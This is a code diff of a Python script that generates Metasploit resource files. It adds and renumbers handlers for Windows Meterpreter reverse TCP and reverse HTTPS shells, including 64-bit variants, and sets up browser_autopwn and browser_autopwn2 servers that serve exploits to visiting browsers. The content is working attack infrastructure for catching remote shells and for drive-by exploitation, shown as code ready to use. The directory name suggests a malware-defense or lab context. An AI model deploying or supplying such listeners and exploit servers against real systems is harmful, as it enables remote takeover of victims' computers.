@@ -8,9 +8,9 @@ import sys
 import os
 
 def build(lhost,lport):
-  listenerPath="/opt/local/malwaredefense"
+  listenerPath="/opt/malwaredefense/current"
 #====================================================
-  listenerFileName="{0}/{1}".format(listenerPath,"500-reverse_tcp_noenc.rc")
+  listenerFileName="{0}/{1}".format(listenerPath,"900-reverse_tcp_noenc.rc")
   options = "use multi/handler\n"
   options += "set payload windows/meterpreter/reverse_tcp\n"
   options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
@@ -29,29 +29,8 @@ def build(lhost,lport):
 
 
 #====================================================
-
-
-
-  listenerFileName="{0}/{1}".format(listenerPath,"501-reversehttps.rc")
-  options = "use multi/handler\n"
-  options += "set payload windows/meterpreter/reverse_https\n"
-  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
-  options += "set ExitOnSession false\n"
-  options += "set EnableStageEncoding false\n"
-  #options += "set AutoRunScript post/windows/manage/smart_migrate\n"
-  options += "exploit -j\n"
-  if not os.path.exists(os.path.dirname(listenerFileName)):
-    try:
-        os.makedirs(os.path.dirname(listenerFileName))
-    except OSError as exc:
-        if exc.errno != errno.EEXIST:
-            raise
-  with open(listenerFileName, "w") as f:
-    f.write(options)
-    f.close()
-
 #====================================================
-  listenerFileName="{0}/{1}".format(listenerPath,"502-reverse_tcp.rc")
+  listenerFileName="{0}/{1}".format(listenerPath,"905-reverse_tcp.rc")
   options = "use multi/handler\n"
   options += "set payload windows/meterpreter/reverse_tcp\n"
   options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
@@ -69,7 +48,73 @@ def build(lhost,lport):
     f.close()
 
 #====================================================
-  listenerFileName="{0}/{1}".format(listenerPath,"503-browserautopwn1.rc")
+
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"910-reverse_tcp_noenc-64.rc")
+  options = "use multi/handler\n"
+  options += "set payload windows/x64/meterpreter/reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding false\n"
+  options += "exploit -j\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+#====================================================
+
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"915-reverse_tcp_-64.rc")
+  options = "use multi/handler\n"
+  options += "set payload windows/x64/meterpreter/reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding true\n"
+  options += "exploit -j\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+#====================================================
+
+
+#====================================================
+
+  listenerFileName="{0}/{1}".format(listenerPath,"950-reversehttps.rc")
+  options = "use multi/handler\n"
+  options += "set payload windows/meterpreter/reverse_https\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding false\n"
+  #options += "set AutoRunScript post/windows/manage/smart_migrate\n"
+  options += "exploit -j\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"960-browserautopwn1.rc")
   options = "use auxiliary/server/browser_autopwn\n"
   options += "set LHOST {0}\nset SRVHOST {0}\nset SRVPORT 8080\n".format(lhost)
   options += "set URIPATH qrq\n"
@@ -85,7 +130,7 @@ def build(lhost,lport):
     f.close()
 
 #====================================================
-  listenerFileName="{0}/{1}".format(listenerPath,"504-browserautopwn2.rc")
+  listenerFileName="{0}/{1}".format(listenerPath,"965-browserautopwn2.rc")
   options = "use auxiliary/server/browser_autopwn2\n"
   options += "set set SRVHOST {0}\nset SRVPORT 8080\n".format(lhost)
   options += "set URIPATH qrq\n"
